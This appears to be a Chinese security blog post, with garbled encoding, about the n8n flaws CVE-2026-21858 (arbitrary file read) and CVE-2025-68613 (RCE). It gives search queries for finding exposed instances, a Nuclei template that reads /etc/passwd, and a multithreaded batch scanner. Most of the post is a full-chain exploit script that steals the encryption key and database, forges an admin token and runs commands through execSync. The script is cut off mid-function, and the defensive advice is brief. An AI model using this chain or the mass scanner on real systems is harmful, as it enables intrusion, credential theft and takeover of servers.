<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">åº”ç”¨åœºæ™¯</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">å®‰å…¨åŸå› </span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">çº¯æ•°æ®æ”¶é›†è¡¨å•</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">åªä¿å­˜æ•°æ®ï¼Œä¸è¿”å›æ–‡ä»¶å†…å®¹</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">éœ€è¦ SSO çš„ä¼ä¸šè¡¨å•</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">è®¤è¯ä¿æŠ¤</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">n8n Cloud ç”¨æˆ·</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">äº‘æ¶æ„é™åˆ¶</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">å·²å‡çº§åˆ°æ–°ç‰ˆæœ¬</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">è¡¥ä¸ä¿®å¤</span></section></td></tr></tbody></table>  
## æœç´¢è¯­æ³•  
  
n8n å¹³å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2025-68613ï¼‰ZoomEyeæœç´¢app="n8n"  
https://www.zoomeye.org/searchResult?q=YXBwPSJuOG4i  
hunteræœç´¢è¯­æ³•  
```
web.icon=="8ad475e8b10ff8bcff648ae6d49c88ae"
web.icon="8ad475e8b10ff8bcff648ae6d49c88ae"&&icp.number!==""&&icp.name!="å…¬å¸"&&icp.name!="å·¥ä½œå®¤"&&icp.type!="ä¸ªäºº"
```  
### Nucleiæ¨¡æ¿  
```
id:Â CVE-2026-21858-lfi-fixedinfo:Â  name:Â n8nÂ ArbitraryÂ FileÂ ReadÂ (CVE-2026-21858)Â -Â ActiveÂ CheckÂ  author:Â customizedÂ  severity:Â criticalÂ  description:Â |Â  Â  Proves CVE-2026-21858 by reading /etc/passwd via n8n vulnerable form trigger.Â  tags:Â cve,cve2026,n8n,lfirequests:Â  -Â method:Â POSTÂ  Â  path:Â  Â  Â  -Â "{{BaseURL}}/form/vulnerable-form"Â  Â  Â  -Â "{{BaseURL}}/webhook/vulnerable-form"Â  Â  Â  -Â "{{BaseURL}}/form/upload"Â  Â  Â  -Â "{{BaseURL}}/webhook/upload"Â  Â  Â  # å¦‚æœä½ çŸ¥é“å…¶ä»–ç‰¹å®šè·¯å¾„ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ·»åŠ Â  Â  headers:Â  Â  Â  Content-Type:Â "application/json"Â  Â  # è¿™é‡Œçš„ JSON å¿…é¡»æ˜¯å‹ç¼©çš„ä¸€è¡Œï¼Œä¸¥æ ¼æ¨¡ä»¿ Python è„šæœ¬çš„ PayloadÂ  Â  body:Â '{"data":{},"files":{"check_vuln":{"filepath":"/etc/passwd","originalFilename":"check.bin","mimetype":"application/octet-stream","size":1024}}}'Â  Â  matchers-condition:Â andÂ  Â  matchers:Â  Â  Â  -Â type:Â regexÂ  Â  Â  Â  part:Â bodyÂ  Â  Â  Â  regex:Â  Â  Â  Â  Â  -Â "root:.*:0:0:"Â  Â  Â  -Â type:Â statusÂ  Â  Â  Â  status:Â  Â  Â  Â  Â  -Â 200
```  
  
æŠŠä¸Šé¢çš„ä»£ç ä¿å­˜ä¸ºCVE-2026-21858-lfi.yaml  
æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ã€‚  
```
nuclei -u http://8vccf5j.haobachang.loveli.com.cn:8888/ -t CVE-2026-21858-lfi.yaml
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpFbgvBJQKiaicCWH7mnP3lGa4Mp7ao5q7zuicuXnIPUT5c5bGQdc2r7Q7Q/640?wx_fmt=png&from=appmsg "null")  
  
### æ‰¹é‡æµ‹è¯•è„šæœ¬  
  
scan_n8n.py  
å†…å®¹å¦‚ä¸‹  
```
#!/usr/bin/env python3importÂ requestsimportÂ argparseimportÂ urllib3importÂ concurrent.futuresfromÂ urllib.parseÂ importÂ urljoinimportÂ sys# ç¦ç”¨ SSL è­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# é¢œè‰²ä»£ç 
GREEN =Â "\033[92m"
RED =Â "\033[91m"
YELLOW =Â "\033[93m"
RESET =Â "\033[0m"defÂ get_lfi_payload(filepath="/etc/passwd"):Â  Â  """æ„é€ æ¶æ„ JSON Payload"""Â  Â  returnÂ {Â  Â  Â  Â  "data": {},Â  Â  Â  Â  "files": {Â  Â  Â  Â  Â  Â  "check_vuln": {Â  Â  Â  Â  Â  Â  Â  Â  "filepath": filepath,Â  Â  Â  Â  Â  Â  Â  Â  "originalFilename":Â "test.bin",Â  Â  Â  Â  Â  Â  Â  Â  "mimetype":Â "application/octet-stream",Â  Â  Â  Â  Â  Â  Â  Â  "size":Â 1024
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  }defÂ check_vulnerability(target_url, form_path):Â  Â  """æ£€æµ‹å•ä¸ªç›®æ ‡"""Â  Â  # ç¡®ä¿ URL æ ¼å¼æ­£ç¡®Â  Â  ifÂ notÂ target_url.startswith("http"):
Â  Â  Â  Â  target_url =Â f"http://{target_url}"
Â  Â Â 
Â  Â  full_url = urljoin(target_url, form_path)Â  Â Â Â  Â  try:Â  Â  Â  Â  # å‘é€ LFI è¯·æ±‚
Â  Â  Â  Â  response = requests.post(
Â  Â  Â  Â  Â  Â  full_url,
Â  Â  Â  Â  Â  Â  json=get_lfi_payload(),
Â  Â  Â  Â  Â  Â  headers={"Content-Type":Â "application/json"},
Â  Â  Â  Â  Â  Â  timeout=10,
Â  Â  Â  Â  Â  Â  verify=False
Â  Â  Â  Â  )Â  Â  Â  Â Â Â  Â  Â  Â  # æ£€æŸ¥ /etc/passwd çš„ç‰¹å¾å­—ç¬¦Â  Â  Â  Â  ifÂ response.status_code ==Â 200Â andÂ "root:x:0:0"Â inÂ response.text:Â  Â  Â  Â  Â  Â  print(f"[{GREEN}VULN{RESET}]Â {full_url}Â - Successfully read /etc/passwd")Â  Â  Â  Â  Â  Â  returnÂ full_urlÂ  Â  Â  Â  elifÂ response.status_code ==Â 404:Â  Â  Â  Â  Â  Â  # è¿™é‡Œçš„ 404 å¯èƒ½æ„å‘³ç€ Form ID ä¸å¯¹ï¼Œè€Œä¸æ˜¯ n8n ä¸å­˜åœ¨Â  Â  Â  Â  Â  Â  print(f"[{YELLOW}WARN{RESET}]Â {full_url}Â - Form endpoint not found (404)")Â  Â  Â  Â  else:Â  Â  Â  Â  Â  Â  print(f"[{RED}FAIL{RESET}]Â {full_url}Â - Not vulnerable or unknown response (Code:Â {response.status_code})")Â  Â  Â  Â  Â  Â Â Â  Â  exceptÂ requests.exceptions.RequestExceptionÂ asÂ e:Â  Â  Â  Â  print(f"[{RED}ERRÂ {RESET}]Â {target_url}Â - Connection failed:Â {str(e)[:50]}")Â  Â Â Â  Â  returnÂ NonedefÂ main():
Â  Â  parser = argparse.ArgumentParser(description="Batch Scanner for CVE-2026-21858 (n8n LFI)")
Â  Â  parser.add_argument("-f",Â "--file",Â help="File containing list of target URLs", required=True)
Â  Â  parser.add_argument("-p",Â "--path",Â help="Form path to test (default: /form/vulnerable-form)", default="/form/vulnerable-form")
Â  Â  parser.add_argument("-t",Â "--threads",Â help="Number of threads",Â type=int, default=10)
Â  Â  parser.add_argument("-o",Â "--output",Â help="File to save vulnerable URLs", default="vuln_hosts.txt")
Â  Â Â 
Â  Â  args = parser.parse_args()
Â  Â Â 
Â  Â  targets = []Â  Â  try:Â  Â  Â  Â  withÂ open(args.file,Â "r")Â asÂ f:
Â  Â  Â  Â  Â  Â  targets = [line.strip()Â forÂ lineÂ inÂ fÂ ifÂ line.strip()]Â  Â  exceptÂ FileNotFoundError:Â  Â  Â  Â  print(f"Error: FileÂ {args.file}Â not found.")
Â  Â  Â  Â  sys.exit(1)Â  Â  print(f"[*] LoadedÂ {len(targets)}Â targets.")Â  Â  print(f"[*] Testing Form Path:Â {args.path}")Â  Â  print("[*] Starting scan...\n")

Â  Â  vulnerable_hosts = []Â  Â  # å¤šçº¿ç¨‹æ‰«æÂ  Â  withÂ concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)Â asÂ executor:
Â  Â  Â  Â  futures = {executor.submit(check_vulnerability, url, args.path): urlÂ forÂ urlÂ inÂ targets}Â  Â  Â  Â Â Â  Â  Â  Â  forÂ futureÂ inÂ concurrent.futures.as_completed(futures):
Â  Â  Â  Â  Â  Â  result = future.result()Â  Â  Â  Â  Â  Â  ifÂ result:
Â  Â  Â  Â  Â  Â  Â  Â  vulnerable_hosts.append(result)Â  Â  # ä¿å­˜ç»“æœÂ  Â  ifÂ vulnerable_hosts:Â  Â  Â  Â  withÂ open(args.output,Â "w")Â asÂ f:Â  Â  Â  Â  Â  Â  forÂ urlÂ inÂ vulnerable_hosts:
Â  Â  Â  Â  Â  Â  Â  Â  f.write(url +Â "\n")Â  Â  Â  Â  print(f"\n[{GREEN}SUCCESS{RESET}] FoundÂ {len(vulnerable_hosts)}Â vulnerable hosts. Saved toÂ {args.output}")Â  Â  else:Â  Â  Â  Â  print(f"\n[{RED}FINISHED{RESET}] No vulnerable hosts found.")ifÂ __name__ ==Â "__main__":
Â  Â  main()
```  
  
å‡†å¤‡ä¸€ä¸ªÂ target.txt  
ï¼Œæ¯è¡Œä¸€ä¸ªÂ http://ip:port  
ã€‚  
```
python .\scan_n8n.py -f .\target.txt -t 20
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpLkf8Fe3ibSCUDcHeuS7XzRf5UTegmPXtb85mL3Uib7HtQO0j4sjaiaiaUw/640?wx_fmt=png&from=appmsg "null")  
  
## ğŸ›¡ï¸ é˜²å¾¡å»ºè®®  
### å¯¹äº n8n ç”¨æˆ·  
1. 1.Â **ç«‹å³å‡çº§**  
: å‡çº§åˆ° n8n >= 1.121.0  
  
1. 2.Â **å®¡æŸ¥å·¥ä½œæµ**  
: æ£€æŸ¥æ‰€æœ‰å…¬å¼€è¡¨å•æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½  
  
1. 3.Â **æ·»åŠ è®¤è¯**  
: ä¸ºæ‰€æœ‰è¡¨å•æ·»åŠ èº«ä»½éªŒè¯  
  
1. 4.Â **é™åˆ¶è®¿é—®**  
: ä½¿ç”¨ IP ç™½åå•æˆ– VPN  
  
### å¯¹äºå¼€å‘è€…  
1. 1.Â **è¾“å…¥éªŒè¯**  
: éªŒè¯ Content-Type å¿…é¡»æ˜¯ multipart/form-data  
  
1. 2.Â **è·¯å¾„æ²™ç®±**  
: é™åˆ¶æ–‡ä»¶è®¿é—®åœ¨å®‰å…¨ç›®å½•å†…  
  
1. 3.Â **å®‰å…¨å®¡è®¡**  
: å®šæœŸå®¡æŸ¥æ–‡ä»¶å¤„ç†ç›¸å…³ä»£ç   
  
## ğŸ’¡ æ€»ç»“  
  
**CVE-2026-21858 ä¸æ˜¯é€šç”¨æ¼æ´**  
ï¼Œå®ƒéœ€è¦ï¼š  
- â€¢ âœ… ç‰¹å®šçš„å·¥ä½œæµé…ç½®ï¼ˆæ–‡ä»¶ä¸Šä¼  + å“åº”èŠ‚ç‚¹ï¼‰  
  
- â€¢ âœ… å·¥ä½œæµå¤„äºæ¿€æ´»çŠ¶æ€  
  
- â€¢ âœ… æ— è®¤è¯ä¿æŠ¤  
  
- â€¢ âœ… æ˜“å—æ”»å‡»çš„ n8n ç‰ˆæœ¬  
  
**ä½†æ˜¯**  
ï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶çš„ç³»ç»Ÿ**éå¸¸å®¹æ˜“è¢«å®Œå…¨æ”»é™·**  
ï¼š  
1. 1. ä»»æ„æ–‡ä»¶è¯»å– â†’ çªƒå–æ•°æ®åº“å’Œå¯†é’¥  
  
1. 2. Token ä¼ªé€  â†’ è·å–ç®¡ç†å‘˜æƒé™  
  
1. 3. è¡¨è¾¾å¼æ³¨å…¥ â†’ è¿œç¨‹ä»£ç æ‰§è¡Œ  
  
**CVSS è¯„åˆ† 10.0**  
Â æ˜¯åˆç†çš„ï¼Œå› ä¸ºä¸€æ—¦æ¡ä»¶æ»¡è¶³ï¼Œæ”»å‡»é“¾æ˜¯å®Œå…¨å¯é ä¸”æ˜“äºæ‰§è¡Œçš„ã€‚  
## ğŸ”— å‚è€ƒèµ„æº  
### å®˜æ–¹å…¬å‘Š  
  
https://www.cve.org/CVERecord?id=CVE-2026-21858  
### æŠ€æœ¯åˆ†æ  
- â€¢Â   
Cyera Research - Ni8mare Full Write-up[2]  
Â - Original research by Dor Attias  
  
- â€¢Â   
GHSA-v4pr-fm98-w9pg[3]  
Â - CVE-2026-21858  
  
- â€¢Â   
GHSA-v98v-ff95-f3cp[4]  
Â - CVE-2025-68613  
  
- â€¢Â   
Nuclei Template CVE-2025-68613[5]  
  
- â€¢Â   
LeakIX Search Results[6]  
Â - Exposed vulnerable instances  
  
- â€¢Â   
Formidable[7]  
Â - "The library, not the song" (thanks Cyera for the laugh)  
  
### PoC/Exploit  
```
#!/usr/bin/env python3"""CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain ExploitArbitrary File Read â†’ Admin Token Forge â†’ Sandbox Bypass â†’ RCEAuthor: ChocapikkGitHub: https://github.com/Chocapikk/CVE-2026-21858"""importÂ argparseimportÂ hashlibimportÂ jsonimportÂ secretsimportÂ sqlite3importÂ stringimportÂ tempfilefromÂ base64Â importÂ b64encodeimportÂ jwtimportÂ requestsfromÂ pwnÂ importÂ log

BANNER =Â """â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—â•‘ Â  Â  CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain Â  Â  Â  Â  Â â•‘â•‘ Â  Â  Arbitrary File Read â†’ Token Forge â†’ Sandbox Bypass â†’ RCE Â â•‘â•‘ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â•‘â•‘ Â  Â  by Chocapikk Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â â•‘â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"""

RCE_PAYLOAD =Â '={{ (function() { var require = this.process.mainModule.require; var execSync = require("child_process").execSync; return execSync("CMD").toString(); })() }}'defÂ randstr(n:Â intÂ =Â 12) ->Â str:Â  Â  returnÂ "".join(secrets.choice(string.ascii_lowercase + string.digits)Â forÂ _Â inÂ range(n))defÂ randpos() ->Â list[int]:Â  Â  returnÂ [secrets.randbelow(500) +Â 100, secrets.randbelow(500) +Â 100]classÂ Ni8mare:Â  Â  defÂ __init__(self, base_url:Â str, form_path:Â str):Â  Â  Â  Â  self.base_url = base_url.rstrip("/")Â  Â  Â  Â  self.form_url =Â f"{self.base_url}/{form_path.lstrip('/')}"Â  Â  Â  Â  self.session = requests.Session()Â  Â  Â  Â  self.admin_token =Â NoneÂ  Â  defÂ _api(self, method:Â str, path:Â str, **kwargs) -> requests.Response |Â None:
Â  Â  Â  Â  kwargs.setdefault("timeout",Â 30)
Â  Â  Â  Â  kwargs.setdefault("cookies", {"n8n-auth":Â self.admin_token}Â ifÂ self.admin_tokenÂ elseÂ {})
Â  Â  Â  Â  resp =Â self.session.request(method,Â f"{self.base_url}{path}", **kwargs)Â  Â  Â  Â  returnÂ respÂ ifÂ resp.okÂ elseÂ NoneÂ  Â  defÂ _lfi_payload(self, filepath:Â str) ->Â dict:Â  Â  Â  Â  returnÂ {Â  Â  Â  Â  Â  Â  "data": {},Â  Â  Â  Â  Â  Â  "files": {Â  Â  Â  Â  Â  Â  Â  Â  f"f-{randstr(6)}": {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "filepath": filepath,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "originalFilename":Â f"{randstr(8)}.bin",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "mimetype":Â "application/octet-stream",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "size": secrets.randbelow(90000) +Â 10000
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }Â  Â  defÂ _build_nodes(self, command:Â str) ->Â tuple[list,Â dict,Â str,Â str]:
Â  Â  Â  Â  trigger_name, rce_name =Â f"T-{randstr(8)}",Â f"R-{randstr(8)}"
Â  Â  Â  Â  result_var =Â f"v{randstr(6)}"
Â  Â  Â  Â  payload_value = RCE_PAYLOAD.replace("CMD", command.replace('"',Â '\\"'))
Â  Â  Â  Â  nodes = [
Â  Â  Â  Â  Â  Â  {"parameters": {},Â "name": trigger_name,Â "type":Â "n8n-nodes-base.manualTrigger",Â  Â  Â  Â  Â  Â  Â "typeVersion":Â 1,Â "position": randpos(),Â "id":Â f"t-{randstr(12)}"},
Â  Â  Â  Â  Â  Â  {"parameters": {"values": {"string": [{"name": result_var,Â "value": payload_value}]}},Â  Â  Â  Â  Â  Â  Â "name": rce_name,Â "type":Â "n8n-nodes-base.set",Â "typeVersion":Â 2,Â  Â  Â  Â  Â  Â  Â "position": randpos(),Â "id":Â f"r-{randstr(12)}"}
Â  Â  Â  Â  ]
Â  Â  Â  Â  connections = {trigger_name: {"main": [[{"node": rce_name,Â "type":Â "main",Â "index":Â 0}]]}}Â  Â  Â  Â  returnÂ nodes, connections, trigger_name, rce_nameÂ  Â  # ========== Arbitrary File Read (CVE-2026-21858) ==========Â  Â  defÂ read_file(self, filepath:Â str, timeout:Â intÂ =Â 30) ->Â bytesÂ |Â None:
Â  Â  Â  Â  resp =Â self.session.post(Â  Â  Â  Â  Â  Â  self.form_url, json=self._lfi_payload(filepath),
Â  Â  Â  Â  Â  Â  headers={"Content-Type":Â "application/json"}, timeout=timeout
Â  Â  Â  Â  )Â  Â  Â  Â  returnÂ resp.contentÂ ifÂ resp.okÂ andÂ resp.contentÂ elseÂ NoneÂ  Â  defÂ get_version(self) ->Â tuple[str,Â bool]:
Â  Â  Â  Â  resp =Â self._api("GET",Â "/rest/settings", timeout=10)
Â  Â  Â  Â  version = resp.json().get("data", {}).get("versionCli",Â "0.0.0")Â ifÂ respÂ elseÂ "0.0.0"
Â  Â  Â  Â  major, minor =Â map(int, version.split(".")[:2])Â  Â  Â  Â  returnÂ version, major <Â 1Â orÂ (major ==Â 1Â andÂ minor <Â 121)Â  Â  defÂ get_home(self) ->Â strÂ |Â None:
Â  Â  Â  Â  data =Â self.read_file("/proc/self/environ")Â  Â  Â  Â  ifÂ notÂ data:Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  forÂ varÂ inÂ data.split(b"\x00"):Â  Â  Â  Â  Â  Â  ifÂ var.startswith(b"HOME="):Â  Â  Â  Â  Â  Â  Â  Â  returnÂ var.decode().split("=",Â 1)[1]Â  Â  Â  Â  returnÂ NoneÂ  Â  defÂ get_key(self, home:Â str) ->Â strÂ |Â None:
Â  Â  Â  Â  data =Â self.read_file(f"{home}/.n8n/config")Â  Â  Â  Â  returnÂ json.loads(data).get("encryptionKey")Â ifÂ dataÂ elseÂ NoneÂ  Â  defÂ get_db(self, home:Â str) ->Â bytesÂ |Â None:Â  Â  Â  Â  returnÂ self.read_file(f"{home}/.n8n/database.sqlite", timeout=120)Â  Â  defÂ extract_admin(self, db:Â bytes) ->Â tuple[str,Â str,Â str] |Â None:Â  Â  Â  Â  withÂ tempfile.NamedTemporaryFile(suffix=".db")Â asÂ f:
Â  Â  Â  Â  Â  Â  f.write(db)
Â  Â  Â  Â  Â  Â  f.flush()
Â  Â  Â  Â  Â  Â  conn = sqlite3.connect(f.name)
Â  Â  Â  Â  Â  Â  row = conn.execute("SELECT id, email, password FROM user WHERE role='global:owner' LIMIT 1").fetchone()
Â  Â  Â  Â  Â  Â  conn.close()Â  Â  Â  Â  returnÂ (row[0], row[1], row[2])Â ifÂ rowÂ elseÂ NoneÂ  Â  defÂ forge_token(self, key:Â str, uid:Â str, email:Â str, pw_hash:Â str) ->Â str:
Â  Â  Â  Â  secret = hashlib.sha256(key[::2].encode()).hexdigest()
Â  Â  Â  Â  h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]Â  Â  Â  Â  self.admin_token = jwt.encode({"id": uid,Â "hash": h}, secret,Â "HS256")Â  Â  Â  Â  returnÂ self.admin_tokenÂ  Â  defÂ verify_token(self) ->Â bool:Â  Â  Â  Â  returnÂ self._api("GET",Â "/rest/users", timeout=10)Â isÂ notÂ NoneÂ  Â  # ========== RCE (CVE-2025-68613) ==========Â  Â  defÂ rce(self, command:Â str) ->Â strÂ |Â None:
Â  Â  Â  Â  nodes, connections, _, _ =Â self._build_nodes(command)
Â  Â  Â  Â  wf_name =Â f"wf-{randstr(16)}"
Â  Â  Â  Â  workflow = {"name": wf_name,Â "active":Â False,Â "nodes": nodes,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "connections": connections,Â "settings": {}}

Â  Â  Â  Â  resp =Â self._api("POST",Â "/rest/workflows", json=workflow, timeout=10)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  returnÂ None
Â  Â  Â  Â  wf_id = resp.json().get("data", {}).get("id")Â  Â  Â  Â  ifÂ notÂ wf_id:Â  Â  Â  Â  Â  Â  returnÂ None

Â  Â  Â  Â  run_data = {"workflowData": {"id": wf_id,Â "name": wf_name,Â "active":Â False,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "nodes": nodes,Â "connections": connections,Â "settings": {}}}
Â  Â  Â  Â  resp =Â self._api("POST",Â f"/rest/workflows/{wf_id}/run", json=run_data, timeout=30)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  self._api("DELETE",Â f"/rest/workflows/{wf_id}", timeout=5)Â  Â  Â  Â  Â  Â  returnÂ None

Â  Â  Â  Â  exec_id = resp.json().get("data", {}).get("executionId")
Â  Â  Â  Â  result =Â self._get_result(exec_id)Â ifÂ exec_idÂ elseÂ NoneÂ  Â  Â  Â  self._api("DELETE",Â f"/rest/workflows/{wf_id}", timeout=5)Â  Â  Â  Â  returnÂ resultÂ  Â  defÂ _get_result(self, exec_id:Â str) ->Â strÂ |Â None:
Â  Â  Â  Â  resp =Â self._api("GET",Â f"/rest/executions/{exec_id}", timeout=10)Â  Â  Â  Â  ifÂ notÂ resp:Â  Â  Â  Â  Â  Â  returnÂ None
Â  Â  Â  Â  data = resp.json().get("data", {}).get("data")Â  Â  Â  Â  ifÂ notÂ data:Â  Â  Â  Â  Â  Â  returnÂ None
Â  Â  Â  Â  parsed = json.loads(data)Â  Â  Â  Â  # Result is usually the last non-empty stringÂ  Â  Â  Â  forÂ itemÂ inÂ reversed(parsed):Â  Â  Â  Â  Â  Â  ifÂ isinstance(item,Â str)Â andÂ len(item) >Â 3Â andÂ itemÂ notÂ inÂ ("success",Â "error"):Â  Â  Â  Â  Â  Â  Â  Â  returnÂ item.strip()Â  Â  Â  Â  returnÂ NoneÂ  Â  # ========== Full Chain ==========Â  Â  defÂ pwn(self) ->Â bool:
Â  Â  Â  Â  p = log.progress("HOME directory")
Â  Â  Â  Â  home =Â self.get_home()Â  Â  Â  Â  ifÂ notÂ home:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Not found")Â orÂ False
Â  Â  Â  Â  p.success(home)

Â  Â  Â  Â  p = log.progress("Encryption key")
Â  Â  Â  Â  key =Â self.get_key(home)Â  Â  Â  Â  ifÂ notÂ key:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Failed")Â orÂ False
Â  Â  Â  Â  p.success(f"{key[:8]}...")

Â  Â  Â  Â  p = log.progress("Database")
Â  Â  Â  Â  db =Â self.get_db(home)Â  Â  Â  Â  ifÂ notÂ db:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Failed")Â orÂ False
Â  Â  Â  Â  p.success(f"{len(db)}Â bytes")

Â  Â  Â  Â  p = log.progress("Admin user")
Â  Â  Â  Â  admin =Â self.extract_admin(db)Â  Â  Â  Â  ifÂ notÂ admin:Â  Â  Â  Â  Â  Â  returnÂ p.failure("Not found")Â orÂ False
Â  Â  Â  Â  uid, email, pw = admin
Â  Â  Â  Â  p.success(email)

Â  Â  Â  Â  p = log.progress("Token forge")Â  Â  Â  Â  self.forge_token(key, uid, email, pw)
Â  Â  Â  Â  p.success("OK")

Â  Â  Â  Â  p = log.progress("Admin access")Â  Â  Â  Â  ifÂ notÂ self.verify_token():Â  Â  Â  Â  Â  Â  returnÂ p.failure("Rejected")Â orÂ False
Â  Â  Â  Â  p.success("GRANTED!")

Â  Â  Â  Â  log.success(f"Cookie: n8n-auth={self.admin_token}")Â  Â  Â  Â  returnÂ TruedefÂ parse_args():
Â  Â  p = argparse.ArgumentParser(description="n8n Ni8mare - Full Chain Exploit")
Â  Â  p.add_argument("url",Â help="Target URL (http://target:5678)")
Â  Â  p.add_argument("form",Â help="Form path (/form/upload)")
Â  Â  p.add_argument("--read", metavar="PATH",Â help="Read arbitrary file")
Â  Â  p.add_argument("--cmd", metavar="CMD",Â help="Execute single command")
Â  Â  p.add_argument("-o",Â "--output", metavar="FILE",Â help="Save LFI output to file")Â  Â  returnÂ p.parse_args()defÂ run_read(exploit: Ni8mare, path:Â str, output:Â strÂ |Â None) ->Â None:
Â  Â  data = exploit.read_file(path)Â  Â  ifÂ notÂ data:
Â  Â  Â  Â  log.error("File read failed")Â  Â  Â  Â  return
Â  Â  log.success(f"{len(data)}Â bytes")Â  Â  ifÂ output:Â  Â  Â  Â  withÂ open(output,Â "wb")Â asÂ f:
Â  Â  Â  Â  Â  Â  f.write(data)
Â  Â  Â  Â  log.success(f"Saved:Â {output}")Â  Â  Â  Â  returnÂ  Â  print(data.decode())defÂ run_cmd(exploit: Ni8mare, cmd:Â str) ->Â None:
Â  Â  p = log.progress("RCE")
Â  Â  out = exploit.rce(cmd)Â  Â  ifÂ notÂ out:
